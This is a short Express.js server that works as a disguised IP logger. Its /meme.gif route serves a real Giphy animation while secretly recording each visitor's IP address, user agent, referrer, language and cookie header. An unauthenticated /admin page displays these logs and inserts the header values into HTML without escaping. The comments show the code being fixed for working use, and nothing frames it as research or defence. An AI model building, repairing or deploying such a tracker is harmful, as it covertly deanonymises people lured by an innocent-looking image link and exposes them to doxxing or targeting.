const express = require('express');
const https = require('https');
const app = express();

const TARGET_GIF = 'https://media3.giphy.com/media/26n6WywJyh39n1pBu/giphy.gif';
const PORT = process.env.PORT || 3000;

let visitorLogs = [];

function getClientInfo(req) {
    let ip = req.headers['x-forwarded-for']?.split(',')[0].trim() 
          || req.headers['x-real-ip'] 
          || req.socket.remoteAddress || 'Unknown';
    
    if (ip && ip.startsWith('::ffff:')) {
        ip = ip.substring(7);
    }

    return {
        ip: ip,
        timestamp: new Date().toISOString(),
        userAgent: req.headers['user-agent'],
        referrer: req.headers['referer'] || 'direct',
        language: req.headers['accept-language']?.split(',')[0] || 'unknown',
        cookies: req.headers['cookie'] || 'None',
        origin: req.headers['origin'] || 'None',
        host: req.headers['host']
    };
}

// Fixed: Added => after (req, res)
app.get('/meme.gif', (req, res) => {
    const data = getClientInfo(req);
    
    console.log(`[+] New Hit: ${data.ip}`);
    
    visitorLogs.push(data);
    
    if (visitorLogs.length > 100) {
        visitorLogs.shift();
    }

    https.get(TARGET_GIF, (gifRes) => {
        res.setHeader('Content-Type', 'image/gif');
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        gifRes.pipe(res);
    }).on('error', (err) => {
        console.error('GIF Fetch Error:', err);
        res.status(500).send('Error');
    });
});

// Fixed: Added => after (req, res)
app.get('/admin', (req, res) => {
    if (visitorLogs.length === 0) {
        return res.send('No logs yet.');
    }

    let html = `
    <html>
    <head><title>Logs</title></head>
    <body style="font-family: monospace; background: #111; color: #0f0; padding: 20px;">
        <h1>Visitor Logs (${visitorLogs.length})</h1>
    `;
    
    [...visitorLogs].reverse().slice(0, 50).forEach((log) => {
        html += `
        <div style="border-bottom: 1px solid #333; padding: 10px 0;">
            <div>Time: ${log.timestamp}</div>
            <div>IP: ${log.ip}</div>
            <div>UA: ${log.userAgent?.substring(0, 80)}...</div>
            <div>Ref: ${log.referrer}</div>
            <div>Cookies: ${log.cookies}</div>
        </div>
        `;
    });
    
    html += '</body></html>';
    res.send(html);
});

// Fixed: Added => after (req, res)
app.get('/', (req, res) => {
    res.redirect('/meme.gif');
});

// Fixed: Added => after ()
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
